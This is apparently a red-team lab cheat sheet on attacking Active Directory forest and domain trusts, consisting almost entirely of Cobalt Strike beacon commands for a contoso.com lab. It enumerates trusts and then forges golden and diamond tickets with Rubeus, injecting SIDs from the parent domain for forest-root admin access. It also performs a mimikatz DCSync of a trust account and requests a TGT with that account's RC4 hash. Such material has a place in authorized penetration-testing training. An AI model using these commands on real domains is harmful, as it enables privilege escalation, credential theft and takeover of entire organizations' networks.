# C20 - Forest & Domain Trusts

* Inter-Realm Tickets
* Parent-Child Trusts
* Inbound Trusts
* Outbound Trusts

Enumeration Trusted Domain Objects

```
ldapsearch (objectClass=trustedDomain)
```

Enumerate Trust accounts

```
ldapsearch (samAccountType=805306370) --attributes samAccountName
```

Discover Parent/Child Trusts

```
ldapsearch (objectClass=trustedDomain)
```

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
```  

Parent Domain SID lookup

```
ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
```  

Parent domain can be added to the ticket.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
```  

Once the ticket is injected into a logon session, it can be used to access the forest root domain controller.

beacon> ls \\lon-dc-1\c$

Outbound Trusts

```
getuid
ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
make_token CONTOSO\Administrator Passw0rd!
ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

run klist
```


